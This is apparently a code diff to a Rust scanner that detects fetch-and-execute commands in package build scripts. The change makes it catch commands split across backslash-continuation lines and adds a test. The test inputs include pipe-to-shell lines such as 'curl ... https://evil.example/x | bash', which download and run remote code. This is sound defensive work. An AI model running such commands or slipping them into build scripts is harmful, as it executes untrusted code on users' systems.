@@ -14,6 +14,7 @@
 
 use super::SecurityAnalyzer;
 use crate::error::Result;
+use crate::textutil::logical_lines;
 use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
 use async_trait::async_trait;
 use lazy_static::lazy_static;
@@ -51,11 +52,15 @@ impl RemoteExecAnalyzer {
 
     fn scan(&self, text: &str, file: &std::path::Path, in_install: bool) -> Vec<Finding> {
         let mut findings = Vec::new();
-        for (idx, line) in text.lines().enumerate() {
+        // Splice backslash-newline continuations so `curl evil \`<nl>`| sh`
+        // cannot escape the fetch-exec pattern by living on two physical lines.
+        for (phys_line, line) in logical_lines(text) {
+            let line = line.as_str();
             let trimmed = line.trim_start();
             if trimmed.starts_with('#') || !FETCH_EXEC.is_match(line) {
                 continue;
             }
+            let idx = phys_line - 1;
             let urls: Vec<String> = URL.find_iter(line).map(|m| clean_url(m.as_str())).collect();
             let where_ = if in_install { " (install script)" } else { "" };
             let url_msg = if urls.is_empty() {
@@ -141,6 +146,18 @@ mod tests {
         let a = RemoteExecAnalyzer::new();
         let f = a.scan("bash <(curl -s https://x.io/i)", Path::new("PKGBUILD"), false);
         assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"));
+    }
+
+    #[test]
+    fn detects_continuation_split_fetch_exec() {
+        // CR-3: the pipe-to-shell is on a backslash-continuation line.
+        let a = RemoteExecAnalyzer::new();
+        let f = a.scan(
+            "build() {\n  curl -fsSL https://evil.example/x \\\n    | bash\n}",
+            Path::new("PKGBUILD"),
+            false,
+        );
+        assert!(f.iter().any(|x| x.id == "EXEC-REMOTE"), "continuation-split fetch|exec must be caught");
     }
 
     #[test]
